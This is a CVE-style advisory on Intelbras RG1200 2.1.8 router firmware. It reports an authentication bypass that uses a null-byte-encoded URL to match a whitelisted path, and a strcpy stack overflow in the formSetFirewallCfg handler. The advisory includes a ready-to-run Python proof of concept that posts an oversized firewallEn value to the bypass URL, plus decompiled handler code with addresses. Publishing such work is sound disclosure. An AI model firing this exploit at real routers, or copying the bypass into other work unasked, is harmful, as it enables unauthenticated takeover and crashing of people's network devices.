# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`formSetFirewallCfg`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`formSetFirewallCfg`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Whitelist checks are performed against the raw URL, while the form dispatcher resolves the decoded/truncated path, enabling crafted requests to bypass authentication and reach protected handlers.

After authentication bypass, an attacker can trigger a stack buffer overflow in `formSetFirewallCfg`. The handler copies the user-controlled `firewallEn` parameter into a small fixed-size stack buffer using `strcpy` without enforcing an upper bound.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
  base = f"http://{target_ip}:{port}"
  url = f"{base}/goform/formSetFirewallCfg%00img/main-logo.png"

  data = {
    "firewallEn": "A" * 100,
    "sip": "0",
  }

  headers = {
    "Cookie": cookie,
  }

  r = requests.post(url, data=data, headers=headers, timeout=10)
  print("status:", r.status_code)
  print(r.text[:2000])


if __name__ == "__main__":
  if len(sys.argv) < 2:
    print("usage: python poc.py <target_ip> [port]")
    sys.exit(1)
  ip = sys.argv[1]
  port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
  exploit(ip, port=port)
```

## Cause Analysis

### 1. Authentication Bypass — Raw URL vs Decoded Path Inconsistency

The HTTP request parsing logic in `websParseFirst` (0x42ea1c) stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` → `websUrlParse`:

```c
// websParseFirst (0x42ea1c) — sets wp->url = raw, wp->path = decoded
int __cdecl websParseFirst(webs_t wp, char_t *text)
{
    url = strtok(0, " \t\n");                         // raw URL from HTTP request line
    if ( websUrlParse(url, &buf, &host, &path, &port, &query, &proto, 0, &ext) >= 0 )
    {
        wp->url = bstrdup(url);      // ← raw URL, NOT decoded
        wp->path = bstrdup(path);    // ← decoded path from websDecodeUrl
        // ...
    }
}
```

In `R7WebsSecurityHandler` (0x434c34), the whitelist check is performed using `strstr(url, ...)` on the **raw** `url` parameter (which is `wp->url`). By crafting a raw URL such as `/goform/formSetFirewallCfg%00img/main-logo.png`, the security handler matches the whitelisted substring and returns 0 (allow) without enforcing authentication:

```c
// R7WebsSecurityHandler (0x434c34) — whitelist check on raw URL
if ( !strncmp(url, "/public/", 8u)
  || !strncmp(url, "/lang/", 6u)
  || strstr(url, "img/main-logo.png")    // ← BYPASS: matches %00img/main-logo.png in raw URL
  || strstr(url, "reasy-ui-1.0.3.js")
  // ...
{
    return 0;  // ← Authentication bypassed
}
```

Meanwhile, `websDecodeUrl` (0x430ebc) decodes `%00` to a null byte, causing `websFormHandler` (0x415710) to receive the **decoded** path `/goform/formSetFirewallCfg` and dispatch to the handler.

### 2. Stack Buffer Overflow — strcpy into 8-byte buffer in formSetFirewallCfg

`formSetFirewallCfg` (0x487390) obtains `firewall_value = websGetVar(wp, "firewallEn", ...)` and, after only checking `strlen >= 4`, copies it into a tiny 8-byte stack buffer via `strcpy`:

```c
// formSetFirewallCfg (0x487390)
void __cdecl formSetFirewallCfg(webs_t wp, char_t *path, char_t *query)
{
    char *firewall_value;
    char firewall_buf[8];       // ← 8-byte stack buffer
    char old_ddos_buf[64];
    char old_wan_ping_buf[8];
    char mib_value[68];

    memset(firewall_buf, 0, sizeof(firewall_buf));
    firewall_value = websGetVar(wp, "firewallEn", "1111");
    sip_value = websGetVar(wp, "sip", "0");
    // ... sip handling ...
    if ( strlen(firewall_value) >= 4 )    // ← only checks minimum length, not maximum
    {
        strcpy(firewall_buf, firewall_value);  // ← OVERFLOW: copies into 8-byte buffer with no upper bound
        // ...
        sprintf(mib_value, "%c,1500;%c,1500;%c,1500", firewall_buf[0], firewall_buf[2], firewall_buf[1]);
        SetValue("security.ddos.map", mib_value);
        SetValue("firewall.pingwan", &firewall_buf[3]);
    }
}
```

The guard `strlen(firewall_value) >= 4` only enforces a **minimum** length. There is no upper bound check, so `strcpy` copies an arbitrarily long `firewallEn` value into the 8-byte `firewall_buf`, corrupting adjacent stack variables (`old_ddos_buf`, `old_wan_ping_buf`, `mib_value`).


